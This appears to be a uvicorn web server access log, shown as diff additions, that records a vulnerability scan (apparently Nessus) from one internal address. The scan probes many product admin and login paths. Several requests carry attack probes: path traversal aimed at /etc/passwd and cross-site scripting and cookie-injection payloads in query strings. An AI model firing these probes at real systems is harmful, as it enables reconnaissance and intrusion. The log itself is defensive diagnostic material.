+INFO:     192.168.31.2:46782 - "GET /jts/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46792 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46806 - "GET /dp/login.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46818 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46824 - "GET /albatross/A3Suite HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46832 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46842 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46846 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46862 - "GET /shared/userlogin.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46876 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46884 - "GET /aspera/faspex/login/new?local=true HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46896 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46904 - "GET /trc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46912 - "GET /../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46914 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46922 - "GET /~nobody/etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     192.168.31.2:51020 - "HEAD / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:51028 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:51044 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51052 - "GET /imc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51056 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51072 - "GET /remotesupport/rest/productinfo HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51076 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51078 - "GET // HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51082 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51088 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51092 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51106 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51114 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51130 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51144 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51158 - "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51162 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51168 - "GET /SiteScope/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51184 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51196 - "GET /oo/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51210 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51212 - "GET /xmldata?item=all HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51224 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51228 - "GET /nnm/main HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51230 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51240 - "GET /autopass/login_input HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51250 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51258 - "GET /hazelcast/rest/cluster HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51270 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51274 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51282 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51296 - "GET /public/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51306 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51310 - "GET /com/novell/webaccess/WebAccessUninstall.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51326 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51342 - "GET /portal HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51350 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51366 - "GET /servlet/webacc?error=webacc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51382 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51394 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51400 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51404 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51408 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51414 - "GET /about/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:51444 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51454 - "GET /portal/loginpage.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51470 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51482 - "GET /users/sign_in HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51490 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51496 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51500 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51502 - "GET /console/portal/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51518 - "GET /console/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51534 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51544 - "GET /archiverspaapi/api/product HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51546 - "GET /WEB-INF./web.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51562 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51566 - "GET /ews/index.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51582 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51592 - "GET /_vti_bin/shtml.dll/_vti_rpc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51602 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51618 - "GET /_vti_bin/fpcount.exe HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51640 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51642 - "GET /goanywhere/auth/Login.xhtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51650 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51652 - "GET /workflow/servlet/ftpservlet HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:51548 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51550 - "GET /gui/i18n/messages.en.json HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:53586 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53592 - "GET /system/console?version=1.5 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53604 - "GET /images/login_top.gif HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53612 - "GET /images/logon_merge.gif HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53626 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53634 - "GET /431cb5237001e73e794398e4fa3cf660/css/main-green.css HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53646 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53656 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:53666 - "GET /f360/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:53670 - "GET //login.jsp HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:51914 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51930 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51944 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51952 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51956 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51958 - "GET /features HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51968 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51982 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51990 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51998 - "GET //login/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:52014 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52022 - "GET /fpui/jsp/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:52026 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52032 - "GET /ui/login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:52048 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52052 - "GET /acopia/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:52054 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52070 - "GET /eonapi/getAuthenticationStatus HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:56070 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56086 - "GET /login.web HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56088 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56102 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56108 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56124 - "POST /spipe?Source=nessus HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:56140 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56154 - "GET /PUBLIC/ADMIN/INDEX.HTM HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56160 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56168 - "GET /SE/appInfo.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56184 - "GET /SE/EMC_SE.swf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56192 - "GET /SE/EMC_SE.swf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56202 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56216 - "GET /RSAarcher/Default.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56232 - "GET /RSAarcher/Default.asp HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:56254 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56256 - "GET /dtlt/home.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56262 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56274 - "GET /desktop/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56290 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56300 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56302 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56316 - "GET /IPCamDesc.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56332 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56338 - "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56346 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56358 - "GET /web/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56366 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56382 - "GET /aqPPgy_c.ashx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56398 - "GET /hihUmjzV.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56402 - "GET /c5l3FR8f.asmx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56408 - "GET /QwVHrwh6.rem HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56418 - "GET /C_YK4Xeu.soap HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56422 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56436 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56438 - "OPTIONS %2A HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:56440 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:56452 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:44036 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44052 - "GET /OsuOUXO1.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44068 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44080 - "GET /TevpNPjQ.ashx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44084 - "GET /0PRMkZ2x.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44096 - "GET /znaDVQny.asmx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44100 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44116 - "GET /syslog.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44120 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44136 - "GET /user/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44138 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44148 - "GET /probe/probeInfo HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44156 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44162 - "GET /devinfo.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44164 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44178 - "GET /js/webcfg.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44184 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44194 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44210 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44216 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44218 - "GET /api HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44230 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44240 - "POST /storageevent/CompellentStorageEventServices HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44250 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44258 - "GET /about HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44264 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44274 - "GET /servlet/UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44288 - "GET /UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44304 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44312 - "GET /common/about.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44318 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44332 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44346 - "GET /devinfo?area=notice|net|version HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44354 - "GET /ayefeaturesconvert.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44368 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44378 - "GET /Loginhandler/Login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44384 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44398 - "GET /management/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44404 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44414 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44428 - "GET /CVS/Entries HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44434 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44446 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44454 - "GET /rest-service/reviews-v1/versionInfo HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44470 - "GET /index.html?urlmaskfilter=<script>foo</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44474 - "GET /%3Cscript%3Efoo%3C/script%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44486 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44498 - "GET /servlet/webacc?User.lang=<script>foo</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44504 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44516 - "GET /crossdomain.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44532 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44538 - "GET /manage/login.vtl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44544 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44558 - "POST /api/login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44568 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:44584 - "GET /n8iit8ls.asp?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44600 - "GET /n8iit8ls.asp?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44610 - "GET /n8iit8ls.aspx?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44618 - "GET /n8iit8ls.aspx?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44620 - "GET /n8iit8ls.pl?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44632 - "GET /n8iit8ls.pl?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44640 - "GET /n8iit8ls.cgi?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44654 - "GET /n8iit8ls.cgi?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44656 - "GET /n8iit8ls.exe?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44664 - "GET /n8iit8ls.exe?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44666 - "GET /n8iit8ls.cfm?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44678 - "GET /n8iit8ls.cfm?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44682 - "GET /n8iit8ls.html?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44692 - "GET /n8iit8ls.html?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44698 - "GET /n8iit8ls.jsp?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44708 - "GET /n8iit8ls.jsp?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44724 - "GET /n8iit8ls.php?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44740 - "GET /n8iit8ls.php?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44748 - "GET /n8iit8ls.php3?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44764 - "GET /n8iit8ls.php3?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44774 - "GET /n8iit8ls.cfc?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44786 - "GET /n8iit8ls.cfc?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44800 - "GET /n8iit8ls.nsf?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44812 - "GET /n8iit8ls.nsf?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44826 - "GET /n8iit8ls.dll?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44842 - "GET /n8iit8ls.dll?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44850 - "GET /n8iit8ls.fts?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44858 - "GET /n8iit8ls.fts?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44864 - "GET /n8iit8ls.jspa?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44868 - "GET /n8iit8ls.jspa?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44884 - "GET /n8iit8ls.kspx?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44896 - "GET /n8iit8ls.kspx?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44898 - "GET /n8iit8ls.mscgi?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44900 - "GET /n8iit8ls.mscgi?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44908 - "GET /n8iit8ls.do?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44918 - "GET /n8iit8ls.do?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44928 - "GET /n8iit8ls.htm?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44938 - "GET /n8iit8ls.htm?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44946 - "GET /n8iit8ls.idc?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44958 - "GET /n8iit8ls.idc?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44974 - "GET /n8iit8ls.x?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44976 - "GET /n8iit8ls.x?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44982 - "GET /%3Cscript%3Edocument.cookie%3D%22testrxtk%3D2394%3B%22%3C/script%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:44994 - "GET %3Cscript%3Edocument.cookie%3D%22testrxtk%3D2394%3B%22%3C/script%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45000 - "GET /?<script>document.cookie=%22testrxtk=2394;%22</script> HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45014 - "GET /%3Cmeta%20http-equiv%3DSet-Cookie%20content%3D%22testrxtk%3D2394%22%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45018 - "GET %3Cmeta%20http-equiv%3DSet-Cookie%20content%3D%22testrxtk%3D2394%22%3E HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45020 - "GET /?<meta%20http-equiv=Set-Cookie%20content=%22testrxtk=2394%22> HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45026 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45036 - "GET /cld/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45046 - "GET /ConsoleHelp/default.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45062 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45074 - "GET /CFIDE/administrator/settings/version.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45078 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45082 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45090 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45098 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45104 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45116 - "GET /cmf/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45126 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45130 - "GET /clientaccesspolicy.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45136 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45142 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45144 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45150 - "GET /api/config/class/guis HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45164 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45172 - "GET /Director HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45186 - "GET /DesktopDirector HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45192 - "GET /citrix/nfuse/default/login.asp?NFuse_LogoutId=&NFuse_MessageType=Error&NFuse_Message=<SCRIPT>alert('Ritchie')</SCRIPT>&ClientDetection=ON HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45200 - "GET /citrix/MetaframeXP/default/login.asp?NFuse_LogoutId=&NFuse_MessageType=Error&NFuse_Message=<SCRIPT>alert('Ritchie')</SCRIPT>&ClientDetection=ON HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45210 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45214 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45226 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45228 - "GET /vpn/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45252 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45260 - "GET /client/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45266 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45282 - "GET /login?redirects=10 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45286 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45294 - "GET /vsmc.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45310 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45314 - "GET /ControllerWeb/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45328 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45334 - "GET /app/ui/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45340 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45350 - "GET /ui/faces/Login.xhtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45354 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45360 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45376 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45390 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45404 - "GET /system.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45406 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:45410 - "GET /getxml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:45412 - "GET / HTTP/1.1" 200 OK
